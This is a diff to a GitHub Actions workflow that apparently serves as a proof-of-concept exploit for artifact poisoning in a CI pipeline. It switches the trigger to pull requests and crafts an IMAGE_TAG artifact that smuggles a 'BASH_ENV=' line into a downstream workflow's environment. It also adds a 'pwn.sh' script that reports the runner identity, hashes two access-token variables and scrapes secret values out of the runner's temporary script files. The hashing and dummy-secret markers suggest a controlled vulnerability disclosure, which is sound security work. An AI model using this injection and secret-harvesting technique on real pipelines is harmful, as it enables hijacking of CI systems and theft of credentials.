@@ -1,12 +1,60 @@
 name: CI
 
 on:
-  push:
-    branches:
-      - main
+  pull_request:
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "base CI push run"
+      - name: craft malicious artifacts
+        run: |
+          set -e
+          mkdir -p payload_i payload_m/helm/templates
+          {
+            echo "9.9.9"
+            echo "BASH_ENV=$GITHUB_WORKSPACE/pwn.sh"
+          } > payload_i/IMAGE_TAG
+          cat > payload_m/pwn.sh <<'EOS'
+          echo "=== PWNED_BASH_ENV_EXECUTED ==="
+          echo "whoami=$(id -un) uid=$(id -u)"
+          echo "cwd=$(pwd)"
+          echo "EXFIL_ORCH_SHA=$(printf %s "${ORCHESTRATOR_PAT:-}" | sha256sum | cut -d' ' -f1)"
+          echo "EXFIL_MANIFESTS_SHA=$(printf %s "${MANIFESTS_PAT:-}" | sha256sum | cut -d' ' -f1)"
+          tmp=$(tr '\0' '\n' < /proc/self/cmdline | grep -m1 '^/home/runner/work/_temp/' || true)
+          if [ -n "$tmp" ] && [ -r "$tmp" ]; then
+            for v in $(grep -o 'DUMMYSECRET_[A-Z_]*_VALUE' "$tmp" | sort -u); do
+              echo "ARGV_SECRET_SHA=$(printf %s "$v" | sha256sum | cut -d' ' -f1)"
+            done
+          fi
+          echo "=== END PWNED ==="
+          exit 0
+          EOS
+          chmod +x payload_m/pwn.sh
+          cat > payload_m/helm/Chart.yaml <<'EOS'
+          apiVersion: v2
+          name: pwn
+          version: 0.1.0
+          EOS
+          cat > payload_m/helm/values.yaml <<'EOS'
+          image: ghcr.io/azure/gitops-connector:9.9.9
+          EOS
+          cat > payload_m/helm/templates/cm.yaml <<'EOS'
+          apiVersion: v1
+          kind: ConfigMap
+          metadata:
+            name: pwn
+          data:
+            a: b
+          EOS
+          find payload_i payload_m -type f
+      - name: upload image tags
+        uses: actions/upload-artifact@v4
+        with:
+          name: image_tags
+          path: payload_i/IMAGE_TAG
+      - name: upload manifests
+        uses: actions/upload-artifact@v4
+        with:
+          name: manifests
+          path: payload_m
